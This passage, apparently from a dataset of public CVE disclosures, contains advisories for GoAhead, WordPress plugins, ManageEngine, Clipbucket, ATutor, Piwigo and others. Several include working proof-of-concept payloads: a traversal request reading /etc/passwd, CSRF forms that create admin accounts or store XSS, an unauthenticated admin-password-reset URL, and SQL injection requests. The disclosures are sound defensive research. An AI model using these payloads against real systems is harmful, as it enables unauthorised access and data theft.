to ""."" or "".."" (eg. "".x""). By sending a request with a URI that
contains these incorrectly handled segments, it is possible for remote
attackers to cause a heap overflow with attacker-controlled content or
perform a directory traversal attack.
Fixed version: 3.4.2
Bug entry: https://github.com/embedthis/goahead/issues/106
Fix: https://github.com/embedthis/goahead/commit/eed4a7d177bf94a54c7b06ccce88507fbd76fb77
Reported by: Matthew Daley
Detail:
The vulnerability lies in the websNormalizeUriPath function. This
function correctly handles the normalization of URIs consisting of
normal segments as well as ""."" and "".."" segments, but fails to handle
other segments that start with a '.' character.
A quick runthrough of the important parts of this function:
The function starts by splitting up the URI into segments (at forward
slashes) into an array. At the same time, it calculates the total
length of these segments.
The function then iterates through the resulting array in order to
perform an in-place normalization (both the input and output pointers
point to the same array):
* If a given segment does not start with a '.', it is simply copied from the
current input pointer to the current output pointer. The for loop's
increment code will then advance both the input and output pointers.
* Otherwise, if the segment is ""."" or "".."", the input and output pointers are
adjusted appropriately (taking into account the for loop's increment code)
but (correctly) no segment is copied.
* Otherwise the segment starts with a '.' but is not ""."" nor ""..""; in this
case the function incorrectly does nothing and both the input and output
pointers are simply advanced by the for loop's increment code. This
effectively skips over a segment in the segment array without any
modification by the function.
After this iteration has completed, a string buffer for the final
output is allocated. The size used for this allocation comes from the
previously-calculated total segment length, with the addition of space
for forward slashes to join the segments back together again and a
null terminator. The segments in the array up to the final output
pointer are joined together in this buffer with forward slashes
separating them.
There are two ways to exploit this incorrect handling of certain segments:
1) Heap overflow
The heap overflow exploitation lies in the possibility to create a
disconnect between the lengths of the segments left in the segment
array after the iteration has completed and the previously-calculated
total segment length. The previously-calculated length should, in
theory, be the worst-case (longest) final output string buffer size
required (when all segments are left and none are removed by the
normalization iteration). However, since we can force the iteration to
skip over certain segments in the array, it is possible to effectively
duplicate segments in the resulting array; this is done by having the
segment copied from one location to another but then also having the
original copy skipped over, making it appear in the resulting array
twice. When this is done, the previously-calculated length is no
longer long enough for the final output's string buffer, and a heap
overflow occurs while joining together the final result.
As an example, take the following URI as input to the function:
""/./AAAAAAAA/.x"".
The URI is first split into the segments """", ""."", ""AAAAAAAA"" and ""."",
with the total segment length calculated as 0 + 1 + 8 + 2 = 11 bytes.
The normalization iteration proceeds as follows:
* The """" segment is simply copied from input to output, and hence remains
unchanged. Both the input and output pointers are then advanced.
* The ""."" segment causes the output pointer to stay in place while the input
pointer advances forward.
* The ""AAAAAAAA"" segment is simply copied from input to output, and hence
overwrites the previous ""."" segment. Both the input and output pointers are
then advanced.
* Finally, the "".x"" segment is incorrectly handled: no modification of
segments is performed but both the input and output pointers are still
advanced, moving the output pointer over the original ""AAAAAAAA"" segment.
Hence, the resulting segments in the array that are left up to the
final output pointer are """", ""AAAAAAAA"" and ""AAAAAAAA"". Note that the
""AAAAAAAA"" segment has been duplicated. These segments, including
space for forward slashes to join them together with and a null
terminator, have a total length of 0 + 8 + 8 + 2 + 1 = 19 bytes.
A string buffer is then allocated for the final output, which uses the
previously-calculated total segment length of 11 bytes plus 3 bytes
for forward slashes and 1 byte for a null terminator, giving a total
size of 11 + 3 + 1 = 15 bytes.
The resulting segments are finally joined together into this final
output string buffer. In doing so in this case, however, the buffer is
overflowed by 19 - 15 = 4 bytes.
So, a remote attacker can make (ie.) a simple HTTP GET request for the
URI in question and cause a heap overflow. ASAN gives the following
output in this case, which shows the exact moment that the heap
overflow occurs:
=================================================================
==2613==ERROR: AddressSanitizer: heap-buffer-overflow on address
0x60200000d47f at pc 0x7ffff6f34020 bp 0x7fffffffd410 sp
0x7fffffffcbd0
WRITE of size 9 at 0x60200000d47f thread T0
#0 0x7ffff6f3401f in __interceptor_strcpy
(/usr/lib/x86_64-linux-gnu/libasan.so.1+0x2f01f)
#1 0x7ffff63a7d6d in websNormalizeUriPath src/http.c:3320
#2 0x7ffff639b4de in parseFirstLine src/http.c:969
#3 0x7ffff639a905 in parseIncoming src/http.c:880
#4 0x7ffff639a4c9 in websPump src/http.c:829
#5 0x7ffff639a19c in readEvent src/http.c:802
#6 0x7ffff6399de7 in socketEvent src/http.c:740
#7 0x7ffff6399cbc in websAccept src/http.c:719
#8 0x7ffff63ac8ed in socketAccept src/socket.c:327
#9 0x7ffff63ade95 in socketDoEvent src/socket.c:638
#10 0x7ffff63add5f in socketProcess src/socket.c:622
#11 0x7ffff639daf8 in websServiceEvents src/http.c:1307
#12 0x401b5c in main src/goahead.c:153
#13 0x7ffff597ab44 in __libc_start_main
(/lib/x86_64-linux-gnu/libc.so.6+0x21b44)
#14 0x4011d8
(/home/matthew/goahead-3.4.1/build/linux-x64-debug/bin/goahead+0x4011d8)
0x60200000d47f is located 0 bytes to the right of 15-byte region
[0x60200000d470,0x60200000d47f)
allocated by thread T0 here:
#0 0x7ffff6f5973f in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.1+0x5473f)
#1 0x7ffff63a7d04 in websNormalizeUriPath src/http.c:3318
#2 0x7ffff639b4de in parseFirstLine src/http.c:969
#3 0x7ffff639a905 in parseIncoming src/http.c:880
#4 0x7ffff639a4c9 in websPump src/http.c:829
#5 0x7ffff639a19c in readEvent src/http.c:802
#6 0x7ffff6399de7 in socketEvent src/http.c:740
#7 0x7ffff6399cbc in websAccept src/http.c:719
#8 0x7ffff63ac8ed in socketAccept src/socket.c:327
#9 0x7ffff63ade95 in socketDoEvent src/socket.c:638
#10 0x7ffff63add5f in socketProcess src/socket.c:622
#11 0x7ffff639daf8 in websServiceEvents src/http.c:1307
#12 0x401b5c in main src/goahead.c:153
#13 0x7ffff597ab44 in __libc_start_main
(/lib/x86_64-linux-gnu/libc.so.6+0x21b44)
(... snip ...)
As with all heap overflows, it's likely that this can then go on to be
exploited in order to gain full remote code execution, especially in
embedded systems which are less likely to have heap allocators with
modern hardening techniques.
2) Directory traversal
The directory traversal exploitation lies in the fact that we can
force the normalization iteration to skip over certain segments in the
array; namely, we can force it to skip over a "".."" segment. The ""..""
segment will pass through unchanged into the final output string
buffer, where it is treated by the rest of the server as an actual
parent-directory relative segment.
As an example, take the following URI as input to the function:
""/../../../../../.x/.x/.x/.x/.x/.x/etc/passwd"".
The URI is first split into the segments """", "".."", "".."", "".."", "".."",
"".."", "".x"", "".x"", "".x"", "".x"", "".x"", "".x"", ""etc"", and ""passwd"". (The
total segment length that is calculated during this operation is
irrelevant for this mode of exploitation.)
When the normalization iteration reaches the "".x"" segments, the
contents of the segment array are still untouched (as all the previous
segments are either empty or are "".."") and the output pointer is still
pointing back at the """" segment. The incorrect handling of the "".x""
segments only causes the output (and input) pointers to be advanced
forward over the """" and "".."" segments.
When the iteration reaches the ""etc"" segment, all the """" and ""..""
segments have been skipped over; the output pointer is now pointing at
the first "".x"" segment. The ""etc"" is copied over the first "".x""
segment, and the ""passwd"" segment is copied over the second "".x""
segment.
Hence, the resulting segments in the array that are left up to the
final output pointer are """", "".."", "".."", "".."", "".."", "".."", ""etc"" and
""passwd""; note that the "".."" segments are still present.
The final output string buffer is created and the resulting segments
are joined together to give a string of ""/../../../../../etc/passwd"".
The rest of the server is expecting that the result from the function
is normalized and that it contains no relative segments. Hence, the
"".."" segments go unnoticed when opening the content file while
handling the HTTP request. The end result is that the local filesystem
is traversed up from the administrator-configured web root until
reaching the filesystem's root directory and back down again into the
""/etc/passwd"" file. Hence, the file ""/etc/passwd"" is given in response
to the HTTP request, regardless of the configured web root.
So, a remote attacker can make (ie.) a simple HTTP GET request for the
URI in question and get the contents of the ""/etc/passwd"" file:
$ echo -ne 'GET /../../../../../.x/.x/.x/.x/.x/.x/etc/passwd
HTTP/1.0 ' | nc localhost 4700
HTTP/1.0 200 OK
Server: GoAhead-http
Date: Sun Nov 16 17:21:01 2014
Content-Length: 1346
Connection: close
Last-Modified: Sat Oct 25 17:07:25 2014
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
(... snip ...)
Of course, 5 "".."" segments may not be enough to reach the filesystem's
root directory in all cases and so the crafted URI may have to be
extended with more "".."" and "".x"" segments.
- Matthew Daley"
5146,CVE-2015-2755 WordPress AB Google Map Travel CSRF / XSS,,CVE-2015-2755,"===============================================================================
CSRF/Stored XSS Vulnerability in AB Google Map Travel (AB-MAP) Wordpress Plugin
===============================================================================
. contents:: Table Of Content
Overview
========
* Title :Stored XSS Vulnerability in AB Google Map Travel (AB-MAP) Wordpress Plugin
* Author: Kaustubh G. Padwad
* Plugin Homepage: https://wordpress.org/plugins/ab-google-map-travel/
* Severity: HIGH
* Version Affected: Version 3.4 and mostly prior to it
* Version Tested : Version 3.4
* version patched: 4.0
* CVE ID : CVE-2015-2755
Description
===========
Vulnerable Parameter
--------------------
* Latitude:
* Longitude:
* Map Width:
* Map Height:
* Map Zoom:
* And all Input Boxes

About Vulnerability
-------------------
This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin�s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc.
Vulnerability Class
===================
Cross Site Request Forgery (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)
Steps to Reproduce: (POC)
=========================
After installing the plugin
After installing the plugin
1. Goto settings -> Google Map Travel
2. Insert this payload ## ""> <script>+-+-1-+-+alert(document.cookie)</script> ## Into Any above mention Vulnerable parameter
Save settings and see XSS in action
3. Visit Google Map Travel settings page of this plugin anytime later and you can see the script executing as it is stored.
Plugin does not uses any nonces and hence, the same settings can be changed using CSRF attack and the PoC code for the same is below
<html>
<body>
<form action=""http://localhost/wordpress/wp-admin/admin.php?page=ab_map_options"" method=""POST"">
<input type=""hidden"" name=""lat"" value=""&quot;&gt;&#32;&lt;script&gt;&#43;&#45;&#43;&#45;1&#45;&#43;&#45;&#43;alert&#40;document&#46;cookie&#41;&lt;&#47;script&gt;"" />
<input type=""hidden"" name=""long"" value=""76&#46;26730"" />
<input type=""hidden"" name=""lang"" value=""en"" />
<input type=""hidden"" name=""map&#95;width"" value=""500"" />
<input type=""hidden"" name=""map&#95;height"" value=""300"" />
<input type=""hidden"" name=""zoom"" value=""7"" />
<input type=""hidden"" name=""day&#95;less&#95;five&#95;fare"" value=""llllll"" />
<input type=""hidden"" name=""day&#95;more&#95;five&#95;fare"" value=""1&#46;5"" />
<input type=""hidden"" name=""less&#95;five&#95;fare"" value=""3"" />
<input type=""hidden"" name=""more&#95;five&#95;fare"" value=""2&#46;5"" />
<input type=""hidden"" name=""curr&#95;format"" value=""&#36;"" />
<input type=""hidden"" name=""submit"" value=""Update&#32;Settings"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
. image:: csrf.jpeg
:height: 1000 px
:width: 1000 px
:scale: 100 %
:alt: XSS POC
:align: center
Mitigation
==========
Update to version 4.0
Change Log
==========
https://wordpress.org/plugins/ab-google-map-travel/changelog/
Disclosure
==========
07-March-2015 Reported to Developer
11-March-2015 Reported to Wordpress
11-March-2015 Acknowledgement from Developer
16-March-2015 Wordpress reviwed and publish the updated plugin.
16-March-2015 Requested for CVE ID
27-March-2015 CVE Assign
28-March-2015 Reposted with CVE ID
credits
=======
* Kaustubh Padwad
* Information Security Researcher
* kingkaustubh me com
* https://twitter.com/s3curityb3ast
* http://breakthesec.com
* https://www.linkedin.com/in/kaustubhpadwad"
5163,Manage Engine Desktop Central 9 - CVE-2015-2560 - Unauthorised administrative password reset,,CVE-2015-2560,"A vulnerability exists in the Manage Engine Desktop Central 9 application that affects version (build 90130). This may affect earlier releases as well.
The vulnerability allows a remote unauthenticated user to change the password of any Manage Engine Desktop Central user with the �Administrator� role (DCAdmin).
The following proof of concept URL changes the �admin� user password to �admin3�.
http://<IP>:8020/servlets/DCOperationsServlet?operation=addOrModifyUser&roleId=DCAdmin&userName=admin&password=admin3
The XML response suggests the user modification failed, however a user can perform a successful login with the supplied credentials:
<operation>
<operationstatus>Failure</operationstatus>
<message>Problem while modifying user admin in DC.</message>
</operation>
Complete control of the application can now be obtained by an unauthorised user.
Vulnerability remediation:
This vulnerability was fixed in Desktop Central build 90135. Refer to the vendor advisory for product update information and instructions.
Vendor advisory:
https://www.manageengine.com/products/desktop-central/unauthorized-admin-credential-modification.html
Disclosure timeline:
Vendor notification: 02/02/2015
Follow up with Vendor: 16/02/2015
Fixed released: 18/02/2015
CVE requested: 06/03/2015
CVE assigned: 20/03/2015
Vendor notification: 24/03/2015
Public disclosure: 27/03/2015"
5210,Xerces-C Security Advisory [CVE-2015-0252],,CVE-2015-0252,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2015-0252: Apache Xerces-C XML Parser Crashes on Malformed Input
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: Apache Xerces-C XML Parser library versions
prior to V3.1.2
Description: The Xerces-C XML parser mishandles certain kinds of
malformed input documents, resulting in a segmentation fault during
a parse operation. The bug does not appear to allow for remote code
execution, but is a denial of service attack that in many applications
may allow for an unauthenticated attacker to supply malformed input
and cause a crash.
Mitigation: Applications that are using library versions older than
V3.1.2 should upgrade as soon as possible. Distributors of older versions
should apply the patches from this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=1667870
Credit: This issue was reported independently by Anton Rager and Jonathan
Brossard from the Salesforce.com Product Security Team and by Ben Laurie
of Google.
References:
http://xerces.apache.org/xerces-c/secadv/CVE-2015-0252.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJVCzmVAAoJEDeLhFQCJ3lipRoP/RLr+6EyyUBp7PxXi31pHYbv
z7E1GZLZ+349BydmI+28y6QXSjjQIeU1VXHaRdBCpfNqv2rIe7n+s/PvojprdHGZ
Ocxg7iPs+mQTxtkTJht1JqT1d4s96BN+DgPDRf7vUzMsu7u6mf9E+Ds2Yajddqgh
zxmsv5YFJlppeAOKDbyaWPfivJS7ubjDK7SQ8Il5N7XHSmVcdGMjGh0Zmbn0mlzk
iTp13aoEknYI3M+4OpIgtszOgbsMQnhRwOgAX+0jBHxrWkK4MBNlotY6oPtx6zWt
DjM/JRr9+V59BsQKrNmE/D0csoEf4OeBEgeqmNTjpy8EO+gOgVHWMowUUAVQkMqu
37njc8IyR/JXStdtzJpHsj4HO2PE9ZE1Uy69DCqCDEeGWl61qx4+sg7Ul783dAab
hCAvAO0zLiyPgkNdydmBQWGymHsle+niydNAi+EGj47rEJ7lDhJhl9qVQ0zyMXr4
O1//QwV7BUaRcgQhcbvd71KeDkPBBNvwpYLAXxIpDkI1/2qjo8ANHxzu/EMP8weK
N+KoIEugAab+t1s1qWpgneYXHLy3uE3KvVeNvb/iHsl5nzzFVBkPe+2OCZfWoedJ
t7gAXaZ2htrF2BQl6g/5hm13/6ajmrtNcX0hBjx2VB4VACOtt0bqextaW/w2Vvb4
AcsopfNHOGvXLDJ3JkHS
=l9vC
-----END PGP SIGNATURE-----"
5313,[CVE-2015-2102] Clipbucket 2.7 RC3 0.9 - Blind SQL Injection,,CVE-2015-2102,"# Exploit Title : Clipbucket 2.7 RC3 0.9 Blind SQL Injection
# Date : 20 February 2015
# Exploit Author : CWH Underground
# Site : www.2600.in.th
# Vendor Homepage : http://clip-bucket.com/
# Software Link : http://sourceforge.net/projects/clipbucket/files/ClipBucket%20v2/clipbucket-2.7.0.4.v2929-rc3.zip
# Version : 2.7.0.4.v2929-rc3
# Tested on : Window and Linux
,--^----------,--------,-----,-------^--,
| ||||||||| `--------' | O .. CWH Underground Hacking Team ..
`+---------------------------^----------|
`\_,-------, _________________________|
/ XXXXXX /`| /
/ XXXXXX / ` /
/ XXXXXX /\______(
/ XXXXXX /
/ XXXXXX /
(________(
`------'
####################
SOFTWARE DESCRIPTION
####################
ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.This script comes with all
the bells & whistles required to start your own Video Sharing website like Youtube, Metacafe, Veoh, Hulu or any
other top video distribution application in matter of minutes. ClipBucket is fastest growing script which was
first started as Youtube Clone but now its advance features & enhancements makes it the most versatile, reliable &
scalable media distribution platform with latest social networking features, while staying light on your pockets.
Whether you are a small fan club or a big Multi Tier Network operator, Clipbucket will fulfill your video
management needs.
##################################
VULNERABILITY: Blind SQL Injection
##################################
An attacker might execute arbitrary SQL commands on the database server with this vulnerability.
User tainted data is used when creating the database query that will be executed on the database management system (DBMS).
An attacker can inject own SQL syntax thus initiate reading, inserting or deleting database entries or attacking the underlying operating system
depending on the query, DBMS and configuration.
= POC =
GET /clipbucket/view_item.php?item=a%27%20or%20%27a%27=%27a&type=photos&collection=9 => True Condition
GET /clipbucket/view_item.php?item=a%27%20or%20%27a%27=%27b&type=photos&collection=9 => False Condition (Item does not exist.)
################################################################################################################
Greetz : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################"
5323,[CVE-2015-1583] ATutor LCMS - CSRF Vulnerability in Version 2.2,,CVE-2015-1583,"[CVE-2015-1583] ATutor LCMS - CSRF Vulnerability in Version 2.2
----------------------------------------------------------------
Product Information:
Software: ATutor LCMS
Tested Version: 2.2, released 25.8.2014
Vulnerability Type: Cross-Site Request Forgery, CSRF (CWE-352)
Download link: http://atutor.ca/atutor/download.php
Description: ATutor is an Open Source Web-based Learning Content Management System (LCMS) designed with accessibility and adaptability in mind. (copied from http://www.atutor.ca/credits.php#whatatutor)
----------------------------------------------------------------
Issues:
1) CSRF in administrator creation page
2) CSRF in user creation page
----------------------------------------------------------------
Vulnerability description:
1) CSRF in administrator creation page
When an authenticated administrative user of ATutor LCMS is creating another administrator account, the following POST request is sent to the server:
POST /atutor-2.2/ATutor/mods/_core/users/admins/create.php HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Content-Length: 187
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1/atutor-2.2/ATutor/mods/_core/users/admins/create.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: ATutorID=pr6jq1tlfr204nm60p5rtbj0u4; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_limitsel=15; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; flash=yes; PHPSESSID=tg14v79ionj9d7lpelap300p33; cms-panel-collapsed-cms-menu=false; cms-panel-collapsed-cms-content-tools-CMSPagesController=true; cms-panel-collapsed-cms-content-tools-CMSMain=false; _gat=1; _ga=GA1.1.621011711.1425057132
form_password_hidden=ef0f8b6ffb699f90933a3321b00ff6769e018b94&password_error=&login=csrfadmin9&password=&confirm_password=&real_name=&email=csrfadmin9 admin com&priv_admin=1&submit=Save
By executing the following Proof-of-Concept, a new administrative user called ""csrfadmin99"" will be created with the password ""1qazXSW@"".
<html>
<body>
<form action=""http://127.0.0.1/atutor-2.2/ATutor/mods/_core/users/admins/create.php"" method=""POST"">
<input type=""hidden"" name=""form_password_hidden"" value=""ef0f8b6ffb699f90933a3321b00ff6769e018b94"" />
<input type=""hidden"" name=""login"" value=""csrfadmin99"" />
<input type=""hidden"" name=""real_name"" value=""csrfadmin99"" />
<input type=""hidden"" name=""email"" value=""csrfadmin99 admin com"" />
<input type=""hidden"" name=""priv_admin"" value=""1"" />
<input type=""hidden"" name=""submit"" value=""Save"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
2) CSRF in user creation page
When an authenticated administrative user of ATutor LCMS is creating an user, the following POST request is sent to the server:
POST /atutor-2.2/ATutor/mods/_core/users/create_user.php HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Content-Length: 429
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1/atutor-2.2/ATutor/mods/_core/users/create_user.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: ATutorID=0h3qqin6ndjmpt21m7f17i07l7; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_limitsel=15; /impresscms_1.3.7_final/htdocs/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; flash=yes; PHPSESSID=tg14v79ionj9d7lpelap300p33; cms-panel-collapsed-cms-menu=false; cms-panel-collapsed-cms-content-tools-CMSPagesController=true; cms-panel-collapsed-cms-content-tools-CMSMain=false; _gat=1; _ga=GA1.1.621011711.1425057132
ml=&password_error=&form_password_hidden=ef0f8b6ffb699f90933a3321b00ff6769e018b94®istration_token=19569b3551f19d60ddfbe4973d1733079f775568&login=csrfuser9&form_password1=&form_password2=&email=csrfuser9 user com&private_email=1&email2=csrfuser9 user com&first_name=csrfuser9&second_name=&last_name=csrfuser9&id=&status=3&old_status=&year=&month=&day=&address=&postal=&city=&province=&country=&phone=&website=&submit=+Save+
By executing the following Proof-of-Concept, a new instructor user called ""csrfuser99"" will be created with the password ""1qazXSW@"".
<html>
<body>
<form action=""http://127.0.0.1/atutor-2.2/ATutor/mods/_core/users/create_user.php"" method=""POST"">
<input type=""hidden"" name=""form_password_hidden"" value=""ef0f8b6ffb699f90933a3321b00ff6769e018b94"" />
<input type=""hidden"" name=""login"" value=""csrfuser99"" />
<input type=""hidden"" name=""email"" value=""csrfuser99 user com"" />
<input type=""hidden"" name=""private_email"" value=""1"" />
<input type=""hidden"" name=""email2"" value=""csrfuser99 user com"" />
<input type=""hidden"" name=""first_name"" value=""csrfuser99"" />
<input type=""hidden"" name=""last_name"" value=""csrfuser99"" />
<input type=""hidden"" name=""status"" value=""3"" />
<input type=""hidden"" name=""submit"" value=""Save"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
----------------------------------------------------------------
Impact:
1) An attacker is able to create an administrator account with super administrator privilege.
2) An attacker is able to create an user account with instructor privilege.
----------------------------------------------------------------
Solution:
Update using the in-built patcher, Patch ID 0009 and 0011.
----------------------------------------------------------------
Timeline:
Vulnerability found: 10.2.2015 & 28.2.2015
Vendor informed: 10.2.2015 & 28.2.2015
Response by vendor: 11.2.2015 & 28.2.2015
Fix by vendor 23.2.2015 & 28.2.2015
Public Advisory: 1.3.2015
----------------------------------------------------------------
Best regards,
Edric Teo"
5327,[SECURITY] CVE-2015-0254 XXE and RCE via XSL extension in JSTL XML tags,,CVE-2015-0254,"CVE-2015-0254 XXE and RCE via XSL extension in JSTL XML tags
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Standard Taglibs 1.2.1
The unsupported 1.0.x and 1.1.x versions may also be affected.
Description:
When an application uses <x:parse> or <x:transform> tags to process untrusted XML documents, a request may utilize external entity references to access resources on the host system or utilize XSLT extensions that may allow remote execution.
Mitigation:
Users should upgrade to Apache Standard Taglibs 1.2.3 or later.
This version uses JAXP’s FEATURE_SECURE_PROCESSING to restrict XML processing. Depending on the Java runtime version in use, additional configuration may be required:
Java8: External entity access is automatically disabled if a SecurityManager is active.
Java7: JAXP properties may need to be used to disable external access. See http://docs.oracle.com/javase/tutorial/jaxp/properties/properties.html
Java6 and earlier: A new system property org.apache.taglibs.standard.xml.accessExternalEntity may be used to specify the protocols that can be used to access external entities. This defaults to “all” if no SecurityManager is present and to “” (thereby disabling access) if a SecurityManager is detected.
Credit:
David Jorm of IIX"
5333,CVE-2014-8487: Kony EMM insecurity Direct Object Reference,,CVE-2014-8487,"------------------------------------------------------------------------
Product: Enterprise Mobile Management
Vendor: Kony
Vulnerable Version(s): Kony EMM 1.2 and probably older versions
Tested Version: Drupal Kony EMM 1.2
Advisory Publication: 24 December 2014
Vendor Notification: 8 December 2014
Vulnerability Type: Insecure Direct Object References
CVE Reference: CVE-2014-8487
Risk Level: Low Solution
Status: Solution not yet released
Discovered and Provided: Michael Hendrickx, Help AG
------------------------------------------------------------------------
About the vendor:
Kony EMM is a mobile management suite that allows organizations to manage employee's personal devices. It enables users to use their own device, or as often called BYOD or ""bring your own device"".
About the vulnerability:
During a pentest we discovered that a logged in user can access arbitrary information such as messages and phone information about every phone that's enrolled ot the solution. Often the user's colleagues:
1.) Arbitrary Message retrieval
By using the following URL:
https://<kony_emm>/emm/selfservice/managedevice/getMessageBody?messageId=<message ID>
Where <message ID> is an integer, an attacker can retrieve all messages sent to every mobile enrolled on the system.
2.) Information retrieval
By going to the following URL
https://<kony_emm>/emm/selfservice/devicemgmt/getDeviceInfoTab.htm?requestId=<request_id>&...""
An attacker can retrieve earlier ""requests"". A request ""task"" is generated when a person requests more information about his/her phone, such as IMEI numbers, phone, last locations, etc.
-----------------------
Solution:
The vendor was notified, contact the vendor for the patch details
References:
[1] help AG middle East http://www.helpag.com/
[2] Kony https://kony.com/"
5348,[CVE-2015-1517] Piwigo - SQL Injection in Version 2.7.3,,CVE-2015-1517,"[CVE-2015-1517] Piwigo - SQL Injection in Version 2.7.3
----------------------------------------------------------------
Product Information:
Software: Piwigo
Tested Version: 2.7.3, released on 9 January 2015
Vulnerability Type: SQL Injection (CWE-89)
Download link: http://piwigo.org/basics/downloads
Description: Piwigo is photo gallery software for the web, built by an active community of users and developers. Extensions make Piwigo easily customizable. Icing on the cake, Piwigo is free and opensource (copied from http://piwigo.org/)
----------------------------------------------------------------
Vulnerability description:
When an authenticated user is navigating to ""Photos/Batch Manager"" he is able to apply different filters. When all filters are activated and the button ""Refresh photo set"" is executed, the following POST request is sent to the server:
POST /piwigo-2.7.3/piwigo/admin.php?page=batch_manager HTTP/1.1
Host: <IP>
Content-Type: application/x-www-form-urlencoded
Cookie: pwg_id=ri5ra17df1v20b0h51liekceu1; interface_language=s%3A2%3A%22en%22%3B
filter_category_use=on&filter_level=1'&filter_level_include_lower=on&filter_dimension_min_width=600&filter_filesize_use=on&regenerateSuccess=0&filter_search_use=on&author=Type+the+author+name+here&filter_prefilter=caddie&title=Type+the+title+here&filter_dimension_min_ratio=1.25&level=4&tag_mode=OR&filter_prefilter_use=on&regenerateError=0&filter_filesize_min=0&filter_duplicates_date=on&remove_date_creation=on&date_creation=2015-02-06+00%3a00%3a00&submitFilter=Refresh+photo+set&filter_dimension_max_height=2300&filter_category_recursive=on&remove_title=on&filter_tags_use=on&filter_filesize_max=15.1&filter_dimension_max_width=3500&filter_dimension_max_ratio=1.78&selectAction=------------------&filter_dimension_use=on&remove_author=on&filter_duplicates_dimensions=on&start=0&filter_level_use=on&q=555-555-0199 example com&confirm_deletion=on&filter_dimension_min_height=480
This POST request is prone to boolean-based blind, error-based and AND/OR time-based blind SQL injection in the parameter filter_level. When adding a single quote a database error message can be provoked.
----------------------------------------------------------------
Impact:
Direct database access is possible if an attacker is exploiting the SQL Injection vulnerability.
----------------------------------------------------------------
Solution:
Update to the latest version, which is 2.7.4, see http://piwigo.org/basics/downloads.
----------------------------------------------------------------
Timeline:
Vulnerability found: 6.2.2015
Vendor informed: 6.2.2015
Response by vendor: 7.2.2015
Fix by vendor 12.2.2015
Public Advisory: 18.2.2015
----------------------------------------------------------------
Best regards,
Sven Schleier"
5352,CVE-2015-1614 csrf/xss in in wordpress Plugin Image Metadata cruncher,,CVE-2015-1614,"# Title: CSRF / Stored XSS Vulnerability in IMAGE-MEtadata-Cruncher Wordpress Plugin
# Author: Kaustubh G. Padwad
# CVE-ID : CVE-2015-1614
# Plugin Homepage: https://wordpress.org/plugins/image-metadata-cruncher/
# Severity: Medium
# Description:
# Vulnerable Parameter: Alternate text,Caption,Custom image meta tags
# About Vulnerability: This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin�s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc.
# Vulnerability Class:
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS))
# Steps to Reproduce: (POC):
After installing the plugin
Stored XSS:
1. Goto settings -> image metadata cruncher
2. Paste this payload � �<script>alert(""1"")</script> � in either alternet text,caption,or Custom.
3. once pasted it will popup the alert BOX ;)
4. Visit settings page of this plugin anytime later and you can see the script executing as it is stored.
# CSRF POC
This Plugin is also vulnerable for CSRF Attack also below is the POC for the same
<html>
<body>
<form action=""http://localhost/wordpress/wp-admin/options.php"" method=""POST"">
